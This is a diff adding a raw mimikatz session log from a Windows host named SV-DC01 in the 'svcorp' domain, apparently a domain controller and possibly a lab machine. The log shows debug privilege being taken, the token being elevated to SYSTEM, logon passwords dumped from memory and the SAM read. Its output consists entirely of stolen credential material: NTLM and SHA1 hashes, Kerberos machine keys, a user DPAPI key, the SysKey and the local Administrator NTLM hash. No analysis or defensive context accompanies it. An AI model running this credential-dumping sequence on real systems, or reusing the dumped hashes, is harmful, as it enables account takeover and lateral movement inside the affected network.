@@ -1,0 +1,431 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+528	{0;000003e7} 1 D 33555     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
+ -> Impersonated !
+ * Process Token : {0;00853cdd} 2 F 10033036  	svcorp\tris	S-1-5-21-466546139-763938477-1796994327-1124	(15g,26p)	Primary
+ * Thread Token  : {0;000003e7} 1 D 10081357  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 8724817 (00000000:00852151)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2022 10:50:23 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 8724793 (00000000:00852139)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/9/2022 10:50:23 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 8723827 (00000000:00851d73)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/9/2022 10:50:23 PM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 69091 (00000000:00010de3)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:11 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SV-DC01$
+Domain            : svcorp
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:11 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : sv-dc01$
+	 * Domain   : SVCORP.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 41017 (00000000:0000a039)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:10 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : cbc56ef3f7b00f3d538bdc67435273e7
+	 * SHA1     : 104da492651fff33ceb9bd3c78ea9de25d0be264
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 4e 8d af dc e6 2e 25 ee 76 f1 f1 f5 00 2a d8 22 6d 92 e6 7b 0b 90 48 51 a5 f6 c8 d0 3f 52 10 0e fe 1c c8 5b e4 7c a7 be 82 c0 78 f3 8a c9 0f 61 a9 c3 72 aa 2e ec b4 cf 7b b9 d6 be 59 b6 12 04 20 69 2d 6f 4f 02 54 3e 3c 1d 90 36 38 1c bf 3e c0 d5 ce 97 5f a3 56 28 0f 34 d6 ca fd 24 b6 96 62 3c 1c 3a 7f 65 8f cb e0 58 a5 0c 5d 96 f9 ab e3 b5 66 08 81 ba 2a 19 a6 f1 f8 9d 8d aa 40 1f 53 ad 0c 6b 6e d0 41 b6 fc 93 16 4b 2b 28 b9 17 4b 40 2d 25 37 69 17 ee b2 93 e7 44 bc aa 7a e9 d9 e0 07 c8 3e c2 15 b1 8a e4 66 79 51 ff 3d 29 39 a6 ab 1f 0f 81 20 7b 57 cd dc bf 87 d0 bd 48 9e 9f ae ee 0a 4d a7 a1 f0 1d 06 2e 03 a6 f2 f6 06 ac ff 73 51 b6 58 00 7b e3 4e 53 ca d7 57 ea 87 b8 98 a7 30 b5 11 3b dd f1 f3 be 48 86 dd 70 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40934 (00000000:00009fe6)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:10 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : cbc56ef3f7b00f3d538bdc67435273e7
+	 * SHA1     : 104da492651fff33ceb9bd3c78ea9de25d0be264
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 4e 8d af dc e6 2e 25 ee 76 f1 f1 f5 00 2a d8 22 6d 92 e6 7b 0b 90 48 51 a5 f6 c8 d0 3f 52 10 0e fe 1c c8 5b e4 7c a7 be 82 c0 78 f3 8a c9 0f 61 a9 c3 72 aa 2e ec b4 cf 7b b9 d6 be 59 b6 12 04 20 69 2d 6f 4f 02 54 3e 3c 1d 90 36 38 1c bf 3e c0 d5 ce 97 5f a3 56 28 0f 34 d6 ca fd 24 b6 96 62 3c 1c 3a 7f 65 8f cb e0 58 a5 0c 5d 96 f9 ab e3 b5 66 08 81 ba 2a 19 a6 f1 f8 9d 8d aa 40 1f 53 ad 0c 6b 6e d0 41 b6 fc 93 16 4b 2b 28 b9 17 4b 40 2d 25 37 69 17 ee b2 93 e7 44 bc aa 7a e9 d9 e0 07 c8 3e c2 15 b1 8a e4 66 79 51 ff 3d 29 39 a6 ab 1f 0f 81 20 7b 57 cd dc bf 87 d0 bd 48 9e 9f ae ee 0a 4d a7 a1 f0 1d 06 2e 03 a6 f2 f6 06 ac ff 73 51 b6 58 00 7b e3 4e 53 ca d7 57 ea 87 b8 98 a7 30 b5 11 3b dd f1 f3 be 48 86 dd 70 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 38087 (00000000:000094c7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:08 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 8731887 (00000000:00853cef)
+Session           : RemoteInteractive from 2
+User Name         : tris
+Domain            : svcorp
+Logon Server      : SV-DC01
+Logon Time        : 5/9/2022 10:50:23 PM
+SID               : S-1-5-21-466546139-763938477-1796994327-1124
+	msv :	
+	 [00000003] Primary
+	 * Username : tris
+	 * Domain   : svcorp
+	 * NTLM     : 08df3c73ded940e1f2bcf5eea4b8dbf6
+	 * SHA1     : b6e8eb6ec416d510bd082d72d687b2f41d6b5dc3
+	 * DPAPI    : 2800a2930c81ce49f9cc565282754433
+	tspkg :	
+	wdigest :	
+	 * Username : tris
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : tris
+	 * Domain   : SVCORP.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 8731869 (00000000:00853cdd)
+Session           : RemoteInteractive from 2
+User Name         : tris
+Domain            : svcorp
+Logon Server      : SV-DC01
+Logon Time        : 5/9/2022 10:50:23 PM
+SID               : S-1-5-21-466546139-763938477-1796994327-1124
+	msv :	
+	 [00000003] Primary
+	 * Username : tris
+	 * Domain   : svcorp
+	 * NTLM     : 08df3c73ded940e1f2bcf5eea4b8dbf6
+	 * SHA1     : b6e8eb6ec416d510bd082d72d687b2f41d6b5dc3
+	 * DPAPI    : 2800a2930c81ce49f9cc565282754433
+	tspkg :	
+	wdigest :	
+	 * Username : tris
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : tris
+	 * Domain   : SVCORP.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 8723810 (00000000:00851d62)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/9/2022 10:50:23 PM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:11 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 69110 (00000000:00010df6)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:11 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : cbc56ef3f7b00f3d538bdc67435273e7
+	 * SHA1     : 104da492651fff33ceb9bd3c78ea9de25d0be264
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 4e 8d af dc e6 2e 25 ee 76 f1 f1 f5 00 2a d8 22 6d 92 e6 7b 0b 90 48 51 a5 f6 c8 d0 3f 52 10 0e fe 1c c8 5b e4 7c a7 be 82 c0 78 f3 8a c9 0f 61 a9 c3 72 aa 2e ec b4 cf 7b b9 d6 be 59 b6 12 04 20 69 2d 6f 4f 02 54 3e 3c 1d 90 36 38 1c bf 3e c0 d5 ce 97 5f a3 56 28 0f 34 d6 ca fd 24 b6 96 62 3c 1c 3a 7f 65 8f cb e0 58 a5 0c 5d 96 f9 ab e3 b5 66 08 81 ba 2a 19 a6 f1 f8 9d 8d aa 40 1f 53 ad 0c 6b 6e d0 41 b6 fc 93 16 4b 2b 28 b9 17 4b 40 2d 25 37 69 17 ee b2 93 e7 44 bc aa 7a e9 d9 e0 07 c8 3e c2 15 b1 8a e4 66 79 51 ff 3d 29 39 a6 ab 1f 0f 81 20 7b 57 cd dc bf 87 d0 bd 48 9e 9f ae ee 0a 4d a7 a1 f0 1d 06 2e 03 a6 f2 f6 06 ac ff 73 51 b6 58 00 7b e3 4e 53 ca d7 57 ea 87 b8 98 a7 30 b5 11 3b dd f1 f3 be 48 86 dd 70 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 41002 (00000000:0000a02a)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:10 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40865 (00000000:00009fa1)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:10 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * NTLM     : c618a8af80d96bfcb5c3cbd145188894
+	 * SHA1     : f35bae74720ffd23900257b4718e7d65328b42aa
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp.com
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SV-DC01$
+Domain            : svcorp
+Logon Server      : (null)
+Logon Time        : 3/24/2022 10:14:08 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : SV-DC01$
+	 * Domain   : svcorp
+	 * Password : (null)
+	kerberos :	
+	 * Username : sv-dc01$
+	 * Domain   : SVCORP.COM
+	 * Password : 78 c9 e6 0f 11 da 89 f9 cc 6f c5 7b b0 a4 61 95 7a 18 25 01 35 c8 87 05 b5 fb 73 9e 07 3a 46 39 90 44 68 15 89 20 69 04 8b d4 c9 fa 91 97 04 5c 29 f5 81 60 62 a9 3e c5 50 46 b1 7c 0a e5 4e 5e cd eb 33 9a 77 a2 c3 e3 a3 fa 58 08 33 7d b2 fc 46 cc 6e 27 c7 b4 e9 96 4e 1b 96 14 97 39 42 8c 90 4b 12 7e cd a5 67 83 29 6f ea cf 5c e5 d7 8f bd c6 82 e8 48 eb 4c 47 4d 2c e0 ae 79 85 17 10 b7 9a 5e fe 77 7f 9b a3 97 8b 77 35 a7 09 22 09 fc 32 65 8b f7 d7 6e fd 4f 5d 7a 2a 10 1a 23 91 4e 03 40 10 4f c4 50 b6 8c 1c 5a af 3c 61 20 85 8c 44 16 f6 d3 c1 bc db fc 99 3c d4 2b 52 a3 44 b0 3a 6e 53 a6 d6 04 7c 43 30 39 ad 53 26 67 bf c1 a9 41 84 3d 3d 35 f1 4e e6 1c 0c 34 c4 cf 37 85 a9 9e 2c 8f 79 dd f8 2f b9 04 90 62 45 24 6d 
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # lsadump::sam
+Domain : SV-DC01
+SysKey : 4493df0ed047c2547fbdf1f9eff284c5
+Local SID : S-1-5-21-2951500543-4053234335-1828830959
+
+SAMKey : be8659ca34ea98b49e8570fd8edbbd7b
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 63485d30576a1a741106e3e800053b34
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+
+mimikatz(commandline) # exit
+Bye!
